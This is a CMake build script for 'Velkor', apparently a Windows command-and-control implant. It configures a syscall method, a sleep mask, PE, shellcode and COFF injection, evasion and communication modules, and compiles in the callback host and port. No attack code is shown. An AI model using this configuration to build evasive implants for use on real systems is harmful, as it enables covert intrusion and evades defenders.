cmake_minimum_required(VERSION 3.27)

# Project name
project( Velkor )

# Set architecture and compiler based on ARCH variable
if( ARCH STREQUAL "x64")
    set( CMAKE_CXX_COMPILER "x86_64-w64-mingw32-g++" )
    set( NASM_FLAGS "-f win64" )
elseif( ARCH STREQUAL "x86" )
    set( CMAKE_CXX_COMPILER "i686-w64-mingw32-g++" )
    set( NASM_FLAGS "-f win32" )
endif()

# Set debug compilation options
if ( DEF_DBGMODE STREQUAL "on" )
    set( CMAKE_CXX_FLAGS "-D DEBUG" )
endif()

# Set output directory
set( OUTPUT_DIR "${CMAKE_SOURCE_DIR}/../Bin" )
set( CMAKE_RUNTIME_OUTPUT_DIRECTORY ${OUTPUT_DIR} )

# Set NASM source and output
set( NASM_SRC "${CMAKE_SOURCE_DIR}/Source/Asm/Velkor.${ARCH}.asm" )
set( NASM_OUTPUT "${OUTPUT_DIR}/asm_${PROJECT_NAME}.${ARCH}.o" )

# Include directory
include_directories( ${CMAKE_SOURCE_DIR}/Include )

# set definitions
add_definitions( -D VK_SYSCALL_METHOD=${DEF_APIEXEC} )
add_definitions( -D VK_SLEEP_MASK=${DEF_SLEEPMASK} )
add_definitions( -D VK_SLEEP_TIME=${DEF_SLEEPTIME} )
add_definitions( -D VK_PE_INJ_T=${DEF_PE} )
add_definitions( -D VK_SC_INJ_T=${DEF_SHELLCODE} )
add_definitions( -D VK_COFF_INJ_T=${DEF_COFF} )

add_definitions( -D HOST_CONFIG='L\"${DEF_HOSTS}\"' )
add_definitions( -D PORT_CONFIG=${DEF_PORT} )
# add_definitions( -D USER_AGENT_CONFIG='L\"${DEF_USERAGENT}\"' )

# Linker script
set( LINKER_SCRIPT "${CMAKE_SOURCE_DIR}/Linker.ld" )

# C++ Compiler Flags
set( CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} -masm=intel -fpermissive -mrdrnd" )
set( CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} -fno-ident -fpack-struct=8 -falign-functions=1" )
set( CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} -s -ffunction-sections -falign-jumps=1 -w" )
set( CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} -falign-labels=1 -fPIC -nostdlib" )
set( CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} -Os -fno-asynchronous-unwind-tables" )

# Collect source files
file( GLOB VELKOR_SRC  "${CMAKE_SOURCE_DIR}/Source/*.cc" )
file( GLOB VELKOR_EVS  "${CMAKE_SOURCE_DIR}/Source/Evasion/*.cc" )
file( GLOB VELKOR_MISC "${CMAKE_SOURCE_DIR}/Source/Misc/*.cc" )
file( GLOB VELKOR_COMM "${CMAKE_SOURCE_DIR}/Source/Communication/*.cc" )

# Generate object file from assembly
add_custom_command(
    OUTPUT ${NASM_OUTPUT}
    COMMAND nasm ${NASM_FLAGS} ${NASM_SRC} -o ${NASM_OUTPUT}
    DEPENDS ${NASM_SRC}
    COMMENT "Compiling assembly: ${NASM_SRC}"
)

# Create executable
add_executable( ${PROJECT_NAME}.${ARCH}.exe
    ${VELKOR_SRC}
    ${VELKOR_MISC}
    ${VELKOR_COMM}
    ${VELKOR_EVS}
    ${NASM_OUTPUT}
)

# Apply specific compilation flags to the target
target_compile_options( ${PROJECT_NAME}.${ARCH}.exe PRIVATE
    -masm=intel
    -fpermissive
    -mrdrnd
    -fno-ident
    -fpack-struct=8
    -falign-functions=1
    -s
    -ffunction-sections
    -falign-jumps=1
    -w
    -falign-labels=1
    -fPIC
    -nostdlib
    -Os
    -fno-asynchronous-unwind-tables
)

# Linker options
target_link_options(Velkor.${ARCH}.exe PRIVATE
    -Wl,-s,--no-seh,--enable-stdcall-fixup
)

# Set linker script
set_target_properties(Velkor.${ARCH}.exe PROPERTIES
    LINK_FLAGS "-T ${LINKER_SCRIPT}"
)
